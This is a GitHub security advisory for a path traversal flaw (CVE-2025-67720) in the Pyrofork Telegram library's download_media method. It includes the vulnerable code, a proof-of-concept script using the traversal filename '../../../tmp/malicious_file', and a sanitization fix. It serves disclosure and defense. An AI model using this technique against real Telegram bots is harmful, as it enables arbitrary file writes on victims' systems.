# [M] Pyrofork has a Path Traversal in download_media Method

## Summary
Severity: Medium
Advisory: GHSA-6h2f-wjhf-4wjx
CVE: CVE-2025-67720
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2025-12-10
Source: https://github.com/advisories/GHSA-6h2f-wjhf-4wjx
Type: github-advisory

## Affected
- PyPI: `pyrofork` — affected >=0 <2.3.69

## Details
## Summary

The `download_media` method in Pyrofork does not sanitize filenames received from Telegram messages before using them in file path construction. This allows a remote attacker to write files to arbitrary locations on the filesystem by sending a specially crafted document with path traversal sequences (e.g., `../`) or absolute paths in the filename.

---

## Details

When downloading media, if the user does not specify a custom filename (which is the common/default usage), the method falls back to using the `file_name` attribute from the media object. This attribute originates from Telegram's `DocumentAttributeFilename` and is controlled by the message sender.

### Vulnerable Code Path

**Step 1**: In `pyrogram/methods/messages/download_media.py` (lines 145-151):

```python
media_file_name = getattr(media, "file_name", "")  # Value from Telegram message

directory, file_name = os.path.split(file_name)    # Split user's path parameter
file_name = file_name or media_file_name or ""     # Falls back to media_file_name if empty
```

When a user calls `download_media(message)` or `download_media(message, "downloads/")`, the `os.path.split()` returns an empty filename, causing the code to use `media_file_name` which is attacker-controlled.

**Step 2**: In `pyrogram/client.py` (line 1125):

```python
temp_file_path = os.path.abspath(re.sub("\\\\", "/", os.path.join(directory, file_name))) + ".temp"
```

The `os.path.join()` function does not prevent path traversal. When `file_name` contains `../` sequences or is an absolute path, it allows writing outside the intended download directory.

### Why the existing `isabs` check is insufficient

The check at line 153 in `download_media.py`:

```python
if not os.path.isabs(file_name):
    directory = self.PARENT_DIR / (directory or DEFAULT_DOWNLOAD_DIR)
```

This check only handles absolute paths by skipping the directory prefix, but:
1. For relative paths with `../`, `os.path.isabs()` returns `False`, so the check doesn't catch it
2. For absolute paths, `os.path.join()` in the next step will still use the absolute path directly

---

## PoC

The following Python script demonstrates the vulnerability by simulating the exact code logic from `download_media.py` and `client.py`:

```python
#!/usr/bin/env python3
"""
Path Traversal PoC for Pyrofork download_media
Demonstrates CWE-22 vulnerability in filename handling
"""

import os
import shutil
import tempfile
from pathlib import Path
from dataclasses import dataclass

@dataclass
class MockDocument:
    """Simulates a Telegram Document with attacker-controlled file_name"""
    file_id: str
    file_name: str  # Attacker-controlled!

@dataclass  
class MockMessage:
    """Simulates a Telegram Message"""
    document: MockDocument

DEFAULT_DOWNLOAD_DIR = "downloads/"

def vulnerable_download_media(parent_dir, message, file_name=DEFAULT_DOWNLOAD_DIR):
    """
    Simulates the vulnerable logic from:
    - pyrogram/methods/messages/download_media.py (lines 145-154)
    - pyrogram/client.py (line 1125)
    """
    media = message.document
    media_file_name = getattr(media, "file_name", "")
    
    # Line 150-151: Split and fallback
    directory, file_name = os.path.split(file_name)
    file_name = file_name or media_file_name or ""
    
    # Line 153-154: isabs check (insufficient!)
    if not os.path.isabs(file_name):
        directory = parent_dir / (directory or DEFAULT_DOWNLOAD_DIR)
    
    if not file_name:
        file_name = "generated_file.bin"
    
    # Line 1125 in client.py: Path construction
    import re
    temp_file_path = os.path.abspath(
        re.sub("\\\\", "/", os.path.join(str(directory), file_name))
    ) + ".temp"
    
    return temp_file_path

def run_poc():
    print("=" * 60)
    print("PYROFORK PATH TRAVERSAL PoC")
    print("=" * 60)
    
    with tempfile.TemporaryDirectory() as temp_base:
        parent_dir = Path(temp_base)
        expected_dir = str(parent_dir / "downloads")
        
        print(f"\n[*] Bot working directory: {parent_dir}")
        print(f"[*] Expected download dir: {expected_dir}")
        
        # Attack: Path traversal with ../
        print("\n" + "-" * 60)
        print("TEST: Path Traversal Attack")
        print("-" * 60)
        
        malicious_msg = MockMessage(
            document=MockDocument(
                file_id="test_id",
                file_name="../../../tmp/malicious_file"
            )
        )
        
        result_path = vulnerable_download_media(
            parent_dir=parent_dir,
            message=malicious_msg,
            file_name="downloads/"
        )
        
        # Remove .temp suffix for final path
        final_path = os.path.splitext(result_path)[0]
        
        print(f"[*] Malicious filename: ../../../tmp/malicious_file")
        print(f"[*] Resulting path: {final_path}")
        
        if not final_path.startswith(expected_dir):
            print(f"\n[!] VULNERABILITY CONFIRMED")
            print(f"[!] File path escapes intended directory!")
            print(f"[!] Expected: {expected_dir}/...")
            print(f"[!] Actual: {final_path}")
        else:
            print("[*] Path is within expected directory")

if __name__ == "__main__":
    run_poc()
```

### How to Run

Save the above script and run:

```bash
python3 poc_script.py
```

### Expected Output

```
============================================================
PYROFORK PATH TRAVERSAL PoC
============================================================

[*] Bot working directory: /tmp/tmpXXXXXX
[*] Expected download dir: /tmp/tmpXXXXXX/downloads

------------------------------------------------------------
TEST: Path Traversal Attack
------------------------------------------------------------
[*] Malicious filename: ../../../tmp/malicious_file
[*] Resulting path: /tmp/malicious_file

[!] VULNERABILITY CONFIRMED
[!] File path escapes intended directory!
[!] Expected: /tmp/tmpXXXXXX/downloads/...
[!] Actual: /tmp/malicious_file
```

### Why This Proves the Vulnerability

1. The PoC uses the **exact same logic** as the vulnerable code in `download_media.py` and `client.py`
2. The malicious filename `../../../tmp/malicious_file` causes the path to escape from `/tmp/tmpXXX/downloads/` to `/tmp/malicious_file`
3. Python's `os.path.join()` and `os.path.abspath()` behavior is deterministic - this will work the same way in the real library

---

## Impact

### Who is affected?

- Telegram bots or user accounts using Pyrofork that download media with default parameters
- The common usage pattern `await client.download_media(message)` is affected

### Conditions required for exploitation

1. Attacker must be able to send messages to the victim's bot/account
2. Victim must download the media without specifying a custom filename
3. The bot process must have write permissions to the target location

### Potential consequences

- **Arbitrary file write** to locations writable by the bot process
- Overwriting existing files could cause denial of service or configuration issues
- In specific deployment scenarios, could potentially lead to code execution (e.g., if bot runs with elevated privileges)

---

## Recommended Fix

Add filename sanitization in `download_media.py` after line 151:

```python
file_name = file_name or media_file_name or ""

# Add this sanitization block:
if file_name:
    # Remove any path components, keeping only the basename
    file_name = os.path.basename(file_name)
    # Remove null bytes which could cause issues
    file_name = file_name.replace('\x00', '')
    # Handle edge cases
    if not file_name or file_name in ('.', '..'):
        file_name = ""
```

This ensures that only the filename component is used, stripping any directory traversal sequences or absolute paths.

---

Thank you for your time in reviewing this report. Please let me know if you need any additional information or clarification.

## References
- https://github.com/Mayuri-Chan/pyrofork/security/advisories/GHSA-6h2f-wjhf-4wjx
- https://nvd.nist.gov/vuln/detail/CVE-2025-67720
- https://github.com/Mayuri-Chan/pyrofork/commit/2f2d515575cc9c360bd74340a61a1d2b1e1f1f95
- https://github.com/Mayuri-Chan/pyrofork
